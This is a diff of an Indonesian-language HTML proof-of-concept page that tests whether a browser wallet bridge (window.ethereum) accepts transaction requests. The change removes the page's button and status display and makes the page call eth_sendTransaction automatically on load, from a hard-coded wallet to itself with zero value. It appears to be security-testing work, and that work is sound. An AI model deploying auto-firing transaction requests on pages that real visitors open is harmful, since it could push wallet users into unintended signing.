@@ -2,59 +2,40 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Unauthenticated Bridge Trigger</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; padding: 20px; background: #0f172a; color: #f8fafc; }
-        .box { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
-        pre { color: #38bdf8; overflow-x: auto; font-size: 13px; }
-        .trigger-btn { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-    </style>
+    <title>Security PoC: Bridge Exposure</title>
 </head>
 <body>
-    <div class="box">
-        <h2>Security PoC: Bridge Exposure</h2>
-        <p>Status: <span id="status">Menunggu Eksekusi...</span></p>
-        
-        <p><strong>Deteksi Bridge:</strong></p>
-        <pre id="bridge-info">Mendeteksi...</pre>
-
-        <button class="trigger-btn" onclick="triggerTransaction()">Trigger Transaksi Sekarang</button>
-        <p><small>*Transksi ini hanya simulasi (0 ETH)</small></p>
-    </div>
-
     <script>
-        // 1. Deteksi Bridge
-        const bridge = window.ethereum || window.OneInchProvider; // Tambahkan namespace 1inch
-        
-        window.onload = () => {
-            const info = document.getElementById('bridge-info');
-            if (bridge) {
-                info.textContent = "Bridge Terdeteksi!\nKeys: " + Object.keys(bridge).join(", ");
-                document.getElementById('status').textContent = "Bridge Siap";
-            } else {
-                info.textContent = "Tidak ada bridge ditemukan.";
-            }
-        };
+        // Mengakses bridge yang terdeteksi
+        const bridge = window.ethereum;
 
-        // 2. Fungsi Trigger Transaksi
-        async function triggerTransaction() {
-            if (!bridge) return alert("Bridge tidak ditemukan!");
+        async function triggerRealTx() {
+            // Alamat dompet nyata Anda
+            const MY_WALLET_ADDRESS = "0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE"; 
             
+            const txParams = {
+                from: MY_WALLET_ADDRESS,
+                to: MY_WALLET_ADDRESS, // Mengirim ke diri sendiri
+                value: '0x00',         // Nilai 0 (Aman dari kehilangan dana)
+                data: '0x'
+            };
+
+            console.log("Mencoba memicu transaksi dari: " + MY_WALLET_ADDRESS);
+
             try {
-                document.getElementById('status').textContent = "Memicu Transaksi...";
+                // Memanggil fungsi transaksi
                 await bridge.request({
                     method: 'eth_sendTransaction',
-                    params: [{
-                        from: '0x0000000000000000000000000000000000000000',
-                        to: '0x0000000000000000000000000000000000000000',
-                        value: '0x00',
-                        data: '0x'
-                    }]
+                    params: [txParams]
                 });
             } catch (e) {
-                document.getElementById('status').textContent = "Triggered (User/System Rejected)";
+                console.error("Transkasi ditolak atau dibatalkan:", e);
             }
         }
+
+        // Memicu secara otomatis saat halaman dimuat
+        window.onload = triggerRealTx;
     </script>
+    <p>PoC Sedang Berjalan... Periksa log konsol jika ada error.</p>
 </body>
 </html>
